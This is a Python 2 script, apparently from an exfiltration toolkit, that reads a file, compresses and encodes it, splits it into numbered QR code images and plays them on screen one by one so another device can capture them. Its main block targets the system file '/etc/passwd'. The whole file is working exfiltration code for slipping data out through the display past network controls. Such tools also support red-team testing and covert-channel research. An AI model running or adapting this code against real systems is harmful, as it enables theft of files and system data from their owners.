#!/usr/bin/python

try:
    import os
    import sys
    import zlib
    import time
    import qrcode
    import base64
    import hashlib

    from PIL import Image
except ImportError, e:
    sys.stdout.write("Error importing something. Try 'pip install --user -r requirements'.\n%s\n" % e)
    sys.exit(1)


# Globals
DEFAULT_FOLDER = "pyexfil/physical/qr/outputs/"      # where QR images will be saved
MAXIMUM_QR_SIZE = 800 - 3          # in bytes -2 for index and 1 for delimiter
DELIMITER = ";"
DELAY = 3


def split2len(s, n):
    def _f(s, n):
        while s:
            yield s[:n]
            s = s[n:]
    return list(_f(s, n))


def CreateQRs(filename, folder=DEFAULT_FOLDER):

    # Try opening the file for reading
    try:
        f = open(filename, 'rb')
        data = f.read()
        f.close()
    except IOError, e:
        sys.stdout.write("Error opening file '%s'.\n%s.\n" % (filename, e))
        return False

    hexdigest = hashlib.md5(data).hexdigest()
    zdata = zlib.compress(data)
    zdata = base64.b64encode(zdata)
    data_len = len(zdata)
    slices = split2len(zdata, MAXIMUM_QR_SIZE)

    first_slice_data = filename + DELIMITER + hexdigest + DELIMITER + str(len(slices))
    img = qrcode.make(first_slice_data)
    img.save(folder + "0.png")

    i = 1
    for sly in slices:
        write_me = str(i).zfill(2) + sly
        img = qrcode.make(write_me)
        img.save(folder + str(i) + ".png")
        i += 1
    sys.stdout.write("Saved a total of %s images.\n" % i)
    return True


def PlayQRs(folder=DEFAULT_FOLDER):
    all_pngs = [each for each in os.listdir(folder) if each.endswith('.png')]
    if len(all_pngs) == 0:
        sys.stderr.write("No images found to display.\n")
        return False

    for png in all_pngs:
        i = Image.open(folder + png)
        i.show()
        time.sleep(DELAY)
        i.close()
    sys.stdout.write("Finished playing images.\n")
    return True


if __name__ == "__main__":
    if CreateQRs('/etc/passwd'):
        sys.stdout.write("Will now start playing the QRs.\n")
        time.sleep(DELAY)
        PlayQRs()
    else:
        sys.stderr.write("Something went wrong with creating QRs.\n")
        sys.exit(1)
